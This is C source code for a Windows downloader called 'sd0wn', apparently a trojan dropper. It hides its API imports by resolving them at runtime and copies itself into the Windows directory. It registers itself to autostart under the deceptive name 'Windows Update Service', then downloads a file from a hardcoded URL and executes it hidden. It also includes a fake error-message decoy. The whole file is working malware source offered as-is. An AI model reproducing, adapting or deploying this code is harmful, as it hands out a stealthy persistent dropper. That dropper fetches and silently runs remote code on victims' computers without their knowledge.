//Includes
#include <windows.h>
#include <wininet.h>
#include <urlmon.h>
//if u r compiling with msvc 6.0 include small.h
//#include <small.h>

#define site    "http://www.pscode.com/Upload_PSC/ftp/Convert199806612006.zip"
//sd0wn will download file from this site
#define path    "C:\\test.zip" 
//path where to save file
#define mtxname "sd0wn"
//mutex name
#define time   60 * 1000 //seconds
//how much seconds for sleeping
#define regkey  "Software\\sd0wn"
// save download information to regkey
#define error   "Invalid memory block address"

BOOL RunFile = TRUE;

 typedef void     (__stdcall *EP)(UINT);  
 //ExitProcess
 typedef HANDLE   (__stdcall *CM)(LPSECURITY_ATTRIBUTES,BOOL,LPCTSTR); 
 // CreateMutex
 typedef DWORD    (__stdcall *GT)(void);
 //GetLastError
 typedef LONG     (__stdcall *RK)(HKEY,LPCTSTR,PHKEY); 
 //RegCreateKey
 typedef LONG     (__stdcall *RS)(HKEY,LPCTSTR,DWORD,DWORD,LPCTSTR,DWORD);
 //RegSetValueEx
 typedef LONG     (__stdcall *RC)(HKEY); 
 //fRegCloseKey
 typedef LONG     (__stdcall *RO)(HKEY,LPSTR,DWORD,REGSAM,PHKEY); 
 //fRegOpenKeyEx
 typedef LONG     (__stdcall *RQ)(HKEY,LPSTR,LPDWORD,LPDWORD,LPBYTE,LPDWORD); 
 //fRegQueryValueEx;
 typedef BOOL     (__stdcall *CF)(LPCTSTR,LPCTSTR,BOOL); 
 //CopyFile
 typedef HMODULE  (__stdcall *GH)(LPCTSTR); 
 //GetModuleHandle
 typedef DWORD    (__stdcall *GF)(HMODULE,LPTSTR,DWORD); 
 //fGetModuleFileN
 typedef UINT     (__stdcall *GW)(LPSTR,UINT); 
 //GetWindowsDirectory
 typedef HINSTANCE(__stdcall *SE)(HWND,LPCTSTR,LPCTSTR,LPCTSTR,LPSTR,int); 
 //ShellExecute
 typedef BOOL     (__stdcall *CN)(LPDWORD,DWORD); 
 //InternetGetConnectedState
 typedef void     (__stdcall *SP)(DWORD);
 //Sleep
 typedef HRESULT  (__stdcall *DF)(LPUNKNOWN,LPCSTR,LPCSTR,DWORD,LPBINDSTATUSCALLBACK); 
 //URLDownLoadToFile
 
 typedef int      (__stdcall *MS)(HWND,LPSTR,LPSTR,UINT);

 EP fExitProcess;
 CM fCreateMutex;
 GT fGetLastError;
 RK fRegCreateKey;
 RS fRegSetValueEx;
 RC fRegCloseKey;
 RO fRegOpenKeyEx;
 RQ fRegQueryValueEx;

 CF fCopyFile;
 GH fGetModuleHandle;
 GF fGetModuleFileN;
 GW fGetWindowsDir;
 SE fShellExecute;
 SP fSleep;

 DF fURLDownload;

 CN fNetGetConnState;

 MS fMessageBox;

void mstrcpy(char *s, char *t) // implementation of strcpy
{
 while ((*s++ = *t++) != '\0');
}

void mstrcat(char *s, char *t) // implementation of strcat
{
 int i = 0, j = 0;
  while (s[i] != '\0')i++;
   while ((s[i++] = t[j++]) != '\0'); 
}

int mstrcmp(char *s, char *t) // implementation of strcmp
{
 for (;*s == *t;s++,t++)
  if (*s == '\0')
   return 0;
  return *s - *t;
}

int main()
{
 HINSTANCE kernel32;
 HINSTANCE advapi32;
 HINSTANCE shell32;
 HINSTANCE wininet;
 HINSTANCE urlmon;

 HINSTANCE user32;

 char windir[MAX_PATH];
 char cfile [MAX_PATH];

 char isdwnd[2];
 DWORD issize = sizeof(isdwnd);

 HMODULE hMe;

 HKEY hKey;
 HKEY hOpenkey;

 ULONG FLAGS = INTERNET_CONNECTION_MODEM |
			   INTERNET_CONNECTION_LAN   |
               INTERNET_CONNECTION_PROXY ;
  
  //load libraries
  kernel32 = LoadLibrary("kernel32.dll");
  advapi32 = LoadLibrary("advapi32.dll");
  shell32  = LoadLibrary("shell32.dll");
  wininet  = LoadLibrary("wininet.dll");
  urlmon   = LoadLibrary("urlmon.dll");
  user32   = LoadLibrary("user32.dll");

  //load functions
  fMessageBox = (MS)GetProcAddress(user32,"MessageBoxA");
  
  fExitProcess     = (EP)GetProcAddress(kernel32,"ExitProcess");
  fCreateMutex     = (CM)GetProcAddress(kernel32,"CreateMutexA");
  fGetLastError    = (GT)GetProcAddress(kernel32,"GetLastError");
  fCopyFile        = (CF)GetProcAddress(kernel32,"CopyFileA");
  fGetModuleHandle = (GH)GetProcAddress(kernel32,"GetModuleHandleA");
  fGetModuleFileN  = (GF)GetProcAddress(kernel32,"GetModuleFileNameA");
  fGetWindowsDir   = (GW)GetProcAddress(kernel32,"GetWindowsDirectoryA");
  fSleep		   = (SP)GetProcAddress(kernel32,"Sleep");
  fShellExecute    = (SE)GetProcAddress(shell32,"ShellExecuteA");
  
  fURLDownload     = (DF)GetProcAddress(urlmon,"URLDownloadToFileA");
  
  fRegCreateKey    = (RK)GetProcAddress(advapi32,"RegCreateKeyA");
  fRegSetValueEx   = (RS)GetProcAddress(advapi32,"RegSetValueExA");
  fRegCloseKey     = (RC)GetProcAddress(advapi32,"RegCloseKey");
  fRegOpenKeyEx    = (RO)GetProcAddress(advapi32,"RegOpenKeyExA");
  fRegQueryValueEx = (RQ)GetProcAddress(advapi32,"RegQueryValueExA");

  fNetGetConnState = (CN)GetProcAddress(wininet,"InternetGetConnectedState");

//  fMessageBox(NULL,error,"Error", MB_OK | MB_ICONERROR);

//  fSleep(time);

  //cant run sd0wn twice
  fCreateMutex(NULL, FALSE, mtxname);

  if(fGetLastError() == ERROR_ALREADY_EXISTS)fExitProcess(0);
  
  //get current path
  hMe = fGetModuleHandle(NULL);
  fGetModuleFileN(hMe, cfile, sizeof(cfile));
  
  //get windows dir
  fGetWindowsDir(windir,sizeof(windir));
  mstrcat(windir,"\\sd0wn.exe");

  //AutoRun bla bla bla...
  if(fRegCreateKey(HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\Run",&hKey) == ERROR_SUCCESS)
  {
   fRegSetValueEx(hKey,"Windows Update Service",0,REG_SZ,windir,sizeof(windir));
   fRegCloseKey(hKey);
  }
  //read information from HKEY_CURRENT_USER\\Software\\sd0wn,"Downloaded"
  //if Downloaded value is 1 exit (thats means that file is downloaded) then
  //exit else continue

  if(fRegOpenKeyEx(HKEY_CURRENT_USER,regkey,0,KEY_ALL_ACCESS, &hOpenkey) == ERROR_SUCCESS)
  {
   if (fRegQueryValueEx (  hOpenkey, 
					    "Downloaded", 
						   	    NULL, 
							    NULL, 
 			  (unsigned char*)isdwnd,
							 &issize) 
					== ERROR_SUCCESS)

   if(!mstrcmp(isdwnd,"1"))
	   fExitProcess(0);
  }
 
  //if current path is different from %windir%\\sd0wn.exe copy sd0wn.exe to 
  //windir and execute it

  if(mstrcmp(cfile,windir))
  {
   fCopyFile(cfile,windir,TRUE);
   fShellExecute(0, "open",windir, NULL, NULL, SW_SHOW);
   fExitProcess(0);
  }

  //Check if there is Internet Connections
  //If not Sleep 10 seconds and check again
  //else try to download file /execute it

  while(!(fNetGetConnState(&FLAGS, 0)))fSleep(10*1000);

  if(fURLDownload(0,site,path, 0, 0) == S_OK)
  {
   if(RunFile)
	  fShellExecute(NULL,"open",path,NULL,NULL,SW_HIDE);

   if(fRegCreateKey(HKEY_CURRENT_USER,regkey,&hKey) == ERROR_SUCCESS)
   {
    fRegSetValueEx(hKey,"Downloaded",0,REG_SZ,"1",sizeof(char));
    fRegCloseKey(hKey);
   }
  }
  //FreLibraries
  FreeLibrary(kernel32);
  FreeLibrary(advapi32);
  FreeLibrary(shell32);
  FreeLibrary(user32);

  return 0;
}
 
